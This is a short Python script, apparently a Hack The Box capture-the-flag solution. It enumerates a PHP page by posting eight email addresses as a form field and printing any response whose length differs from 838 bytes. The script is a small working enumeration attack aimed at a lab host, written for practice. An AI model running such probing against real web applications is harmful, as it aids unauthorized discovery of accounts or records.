import requests
import urllib

url = 'http://docker.hackthebox.eu:36117/main/Diaxirisths.php'
#
list = ['CallMePink@newmail.com','BabyNavou@mailpost.gr','imagkakos@badmail.com','NickTheGreek@mail.tr.gr','Windmill@mail.gr','SeVaftise@hotmail.com','fishroesalad@mail.com','OlaMaziLeme@mail.gr']

for x in list:
	post_params = {
		"name1" : x
	}
	print (post_params)
	rs = requests.post(url,data=post_params)
	length = len((rs.content))
	if length != 838:
		print rs.text
